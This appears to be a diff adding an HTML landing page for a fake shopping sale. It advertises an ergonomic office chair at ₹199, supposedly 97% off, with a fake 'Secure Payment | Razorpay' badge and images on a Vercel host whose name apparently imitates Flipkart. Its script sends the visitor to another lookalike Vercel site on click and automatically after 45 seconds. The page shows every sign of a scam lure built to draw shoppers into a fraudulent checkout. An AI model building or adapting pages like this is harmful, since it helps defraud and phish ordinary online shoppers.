@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Special Offer</title>
+    <style>
+        /* Base Styles */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #e5e5e5; /* Light grey background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px 15px;
+        }
+
+        /* Main Card Container */
+        .container {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 420px;
+            border-radius: 24px;
+            padding: 25px 20px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+        }
+
+        /* Header */
+        .header-title {
+            text-align: center;
+            font-size: 26px;
+            font-weight: 800;
+            color: #000000;
+            margin-bottom: 20px;
+            letter-spacing: 0.5px;
+        }
+
+        /* Product Card */
+        .product-card {
+            background-color: #ffffff;
+            border: 1px solid #f0f0f0;
+            border-radius: 16px;
+            padding: 15px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.02);
+            margin-bottom: 20px;
+        }
+
+        /* Image Container */
+        .image-wrapper {
+            width: 100%;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 15px;
+            background-color: #eaf2f8; /* Fallback blue color similar to the image */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .image-wrapper img {
+            width: 100%;
+            height: auto;
+            display: block;
+            object-fit: cover;
+        }
+
+        /* Product Details */
+        .product-title {
+            font-size: 16px;
+            font-weight: 500;
+            color: #222;
+            line-height: 1.4;
+            margin-bottom: 12px;
+        }
+
+        /* Ratings */
+        .rating-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 15px;
+        }
+
+        .rating-badge {
+            background-color: #388e3c;
+            color: white;
+            font-size: 13px;
+            font-weight: 600;
+            padding: 2px 6px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            gap: 2px;
+        }
+
+        .rating-count {
+            color: #666;
+            font-size: 14px;
+        }
+
+        /* Pricing */
+        .price-row {
+            display: flex;
+            align-items: baseline;
+            gap: 10px;
+        }
+
+        .current-price {
+            font-size: 24px;
+            font-weight: 800;
+            color: #000;
+        }
+
+        .original-price {
+            font-size: 16px;
+            color: #888;
+            text-decoration: line-through;
+        }
+
+        .discount {
+            font-size: 16px;
+            font-weight: 700;
+            color: #388e3c;
+        }
+
+        /* Action Button */
+        .btn-continue {
+            width: 100%;
+            background-color: #ed7621; /* Orange color */
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 16px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            transition: background-color 0.2s;
+            margin-bottom: 15px;
+        }
+
+        .btn-continue:hover {
+            background-color: #d96a1b;
+        }
+
+        .btn-continue svg {
+            width: 20px;
+            height: 20px;
+            fill: white;
+        }
+
+        /* Footer */
+        .footer {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            color: #333;
+            font-weight: 500;
+        }
+
+        .footer svg {
+            height: 16px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header-title">WELCOME</div>
+
+        <!-- Product Card -->
+        <div class="product-card">
+            <div class="image-wrapper">
+                <!-- The requested image -->
+                <img src="https://fk-sale-offer.vercel.app/scraped/images/new_p18_main.jpg" alt="Product Image">
+            </div>
+
+            <div class="product-title">
+                Brand GREEN SOUL Kiev Orthopedic Office Chair | Ergonomic Design with Rocking Function Fabric Office Executive Chair (Grey, DIY(Do-It-Yourself))
+            </div>
+
+            <div class="rating-row">
+                <div class="rating-badge">4.4 ★</div>
+                <div class="rating-count">(4320 Ratings)</div>
+            </div>
+
+            <div class="price-row">
+                <div class="current-price">₹199</div>
+                <div class="original-price">₹5,999</div>
+                <div class="discount">97% OFF</div>
+            </div>
+        </div>
+
+        <!-- Action Button -->
+        <button class="btn-continue" id="redirectBtn">
+            <!-- Shopping Cart Icon -->
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zM1 2v2h2l3.6 7.59-1.35 2.45c-.16.28-.25.61-.25.96 0 1.1.9 2 2 2h12v-2H7.42c-.14 0-.25-.11-.25-.25l.03-.12.9-1.63h7.45c.75 0 1.41-.41 1.75-1.03l3.58-6.49c.08-.14.12-.31.12-.48 0-.55-.45-1-1-1H5.21l-.94-2H1zm16 16c-1.1 0-1.99.9-1.99 2s.89 2 1.99 2 2-.9 2-2-.9-2-2-2z"/>
+            </svg>
+            Continue to Shopping
+        </button>
+
+        <!-- Footer -->
+        <div class="footer">
+            <!-- Lock Icon -->
+            <svg viewBox="0 0 24 24" fill="#666" xmlns="http://www.w3.org/2000/svg">
+                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+            </svg>
+            Secure Payment | 
+            <!-- Razorpay Text Placeholder (Using text to keep it simple and clean) -->
+            <span style="font-style: italic; font-weight: bold; color: #0a2540; font-family: sans-serif;">Razorpay</span>
+        </div>
+    </div>
+
+    <!-- JavaScript Logic -->
+    <script>
+        // ==========================================
+        // CONFIGURATION - CHANGE YOUR SETTINGS HERE
+        // ==========================================
+        
+        // 1. Put your original destination URL here
+        const REDIRECT_LINK = "https://fk-bbd-saless-live.vercel.app/"; 
+        
+        // 2. Auto redirect time in milliseconds (45 seconds = 45000)
+        const REDIRECT_TIME = 45000; 
+
+        // ==========================================
+        // DO NOT CHANGE CODE BELOW UNLESS YOU KNOW JS
+        // ==========================================
+
+        // Function to handle redirection
+        function goToLink() {
+            window.location.href = REDIRECT_LINK;
+        }
+
+        // Set the auto-redirect timer
+        setTimeout(goToLink, REDIRECT_TIME);
+
+        // Add click event listener to the button
+        document.getElementById("redirectBtn").addEventListener("click", goToLink);
+    </script>
+</body>
+</html>
